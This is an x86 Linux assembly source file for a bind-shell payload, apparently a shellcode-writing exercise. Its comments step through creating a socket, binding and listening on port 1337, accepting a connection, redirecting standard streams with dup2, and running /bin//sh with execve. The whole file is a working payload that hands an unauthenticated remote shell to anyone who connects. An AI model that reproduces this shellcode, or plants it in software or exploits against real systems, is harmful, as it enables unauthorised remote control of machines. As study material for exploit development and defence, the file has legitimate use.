; bind shell 
; Author: clubjk

global _start

section .text

_start:

	;Create a socket with sys_socket
	
	xor eax, eax    ;zeroize the eax
	xor ebx, ebx    ;zeroize the ebx
	
	mov al, 0x66    ;put socketcall syscall value in eax; 102 in decimal

	mov bl, 0x1     ;put sys_socket syscall value in ebx; 1 in decimal

	xor esi, esi    ;zeroize the esi, it will be convenient when we need a 0x0 value
	push esi        ;put 0x00000000 in stack, using esi since it is currently zeroized
	push ebx        ;put 0x00000001 in stack, using ebx since we set it to 0x1
	push 0x2        ;put 0x00000002 in stack, using immediate value of 0x2

	mov ecx, esp    ;pass memory location of esp (start of the stack) to ecx

	int 0x80        ;calling socket system call (102) with sockcall args


	;Bind socket to an address/port via sys_bind

	
	mov edi, eax	;put the return value from previous syscall (sockfd) in esi for use
	xor eax, eax    ;zeroize the eax
        xor ebx, ebx    ;zeroize the ebx
	xor ecx, ecx    ;zeroize the ecx

	mov al, 0x66   ;put socketcall syscall value in eax; 102 in decimal
	mov bl, 0x2    ;put sys_bind syscall value in ebx, 2 in decimal

	push esi       ;push 0x0 on the stack
	push word 0x3905 ;port 1337 in hex (0x395), then put in little endian 0x3905
	push word bx   ;push 0x2 on the stack
	mov ecx, esp   ;move the memory location of the start of stack (esp) to ecx

	push 0x10      ;push the addrlen=16 on the stack
	push ecx       ;push struct sockaddr pointer on the stack
	push edi       ;push the sockfd (7) on the stack
	
	mov ecx, esp   ;move the memory location of the start of stack (esp) to ecx

	int 0x80       ;calling socket system call (102) with bind args


	;Set up listen system call via sys_listen

	xor ebx, ebx   ;zeroize the ebx
	mov al, 0x66   ;put socketcall syscall value in eax; 102 in decimal
	mov bl, 0x4    ;put listen function call (4) in ebx

	push esi       ;push backlog (0) on stack
	push edi       ;push sockfd (7) on stack
	
	mov ecx, esp   ;move the memory location of the start of stack (esp) to ecx

	int 0x80       ;calling socket system call (102) with listen args


	;Accept a new connection with sys_accept

	mov al, 0x66   ;put socketcall syscall value in eax; 102 in decimal
	inc ebx        ;increment ebx from 4 to 5 (accept function call number)
	push esi       ;push addrlen (0) to stack
	push esi       ;push addr (0) to stack
	push edi       ;push sockfd (7) to stack

	mov ecx, esp   ;move the memory location of the start of stack (esp) to ecx

	int 0x80       ;invokes socket sys call with accept args


	;Redirect standard input (stdin), (stdout), (stderr) (via dup2 syscall)

	xor ecx, ecx   ;zeroize the ecx
	mov cl, 0x2    ;start the counter at 2 (stderr) 
	xchg ebx, eax  ;save the clientfd in ebx
	loop:
		mov al, 0x3f   ;moves the functional call number for dup2 (63) to eax
		int 0x80       ;system call for dup2
		dec ecx        ;decreases ecx by one
		jns loop       ;loop will run until counter is -1 (0xffffffff w SF flag set)
	
	int 0x80       ;invokes the dup2 system call

	;Execute a shell (via execve syscall)

	xor eax, eax   ;zeroize the eax
	push eax       ;push 0x0 on the stack
	push 0x68732f2f        ;push "hs//" on the stack
	push 0x6e69622f        ;push "nib/" on the stack
	mov ebx, esp           ;move the memory location of the start of stack (esp) to ebx
	push eax       ;push 0x0 on the stack
	mov edx, esp   ;move the memory location of the start of stack (esp) to edx
	push ebx       ;push ebx on the stack
	mov ecx, esp   ;move the memory location of the start of stack (esp) to ecx
	mov al, 0xb    ;move the execve functional call number (11) to eax
        
	int 0x80       ;invokes the execve system call




				 
